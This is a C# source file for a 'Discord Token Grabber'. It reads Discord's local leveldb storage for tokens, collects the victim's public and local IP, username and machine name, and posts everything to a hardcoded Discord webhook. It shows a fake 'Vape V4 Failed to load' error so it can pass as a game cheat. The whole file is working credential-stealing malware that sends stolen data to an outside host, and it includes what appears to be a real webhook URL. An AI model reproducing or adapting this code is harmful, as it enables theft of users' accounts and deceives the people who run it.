using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Token_Grabber
{

    public class Run
    {
        public Run()
        {
            new DiscordToken();
            new PrintInfo();
        }

        public static void Main(string[] args)
        {
            new Run();
            Helpers.FakeErrorMsg("Vape V4 Failed to load, exited with error code -1. \n Press any key to exit. . .");
            Console.ReadKey();
        }
    }

    public class Helpers
    {
        public static string internalip = "Nothing";
        public static string weblink = ("https://api.ipify.org/");
        public static void GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    internalip = ip.ToString();
                }
            }
        }

        public static string GetLocalIp()
        {
            string ip = new WebClient().DownloadString(weblink);
            return ip;
        }

        public static void FakeErrorMsg(string error)
        {
            Console.WriteLine(error);
        }

        public static void SendDiscordWebhook(string URL, string escapedjson)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(escapedjson);
            wr.GetResponse();
        }
    }



    public class PrintInfo
    {
        public PrintInfo()
        {
            SendInfo();
        }

        static void SendInfo()
        {
            Helpers.GetLocalIPAddress();
            //Discord webhook url
            string url = "https://discord.com/api/webhooks/960218299042508860/asK8bqJGh8I2EKSgCw2cQgrjAhwiiujHwZ39nwjD5WMNI8DkfBAT33NJcDTpROhXZJtk";
            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":16745830}] }";

            string newjson = json.Insert(65, $"Public IP: {Helpers.GetLocalIp()}");
            newjson = newjson.Insert(79 + Helpers.GetLocalIp().Length, $"Local IP: {Helpers.internalip}");
            newjson = newjson.Insert(92 + Helpers.GetLocalIp().Length + Helpers.internalip.Length, $"Username: {Environment.UserName}");
            newjson = newjson.Insert(105 + Environment.UserName.Length + Helpers.GetLocalIp().Length + Helpers.internalip.Length, $"PC Name: {Environment.MachineName}");


            //Filters through possible tokens
            foreach (string item in DiscordToken.matchs)
            {
                try
                {
                    string virtualjson = newjson.Insert(117 + Helpers.GetLocalIp().Length + Environment.UserName.Length + Environment.MachineName.Length + Helpers.internalip.Length, $"\\n Token: {item}");
                    Helpers.SendDiscordWebhook(url, virtualjson);
                }
                catch { }
            }

        }
    }


    public class DiscordToken
    {

        public static List<string> matchs = new List<string>();
        public DiscordToken()
        {
            GetToken();
        }
        /// <summary>
        /// Name pretty much explains it
        /// </summary>
        public static void GetToken()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                Environment.Exit(0);
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {

                        matchs.Add(match.ToString());
                        matchs.ToArray();
                    }
                }
            }
        }
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                Environment.Exit(0);
                return ldbFiles;
            }

            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string rawText = File.ReadAllText(file);
                if (rawText.Contains("oken"))
                {
                    ldbFiles.Add(rawText);
                }
            }
            return ldbFiles;
        }
    }
}
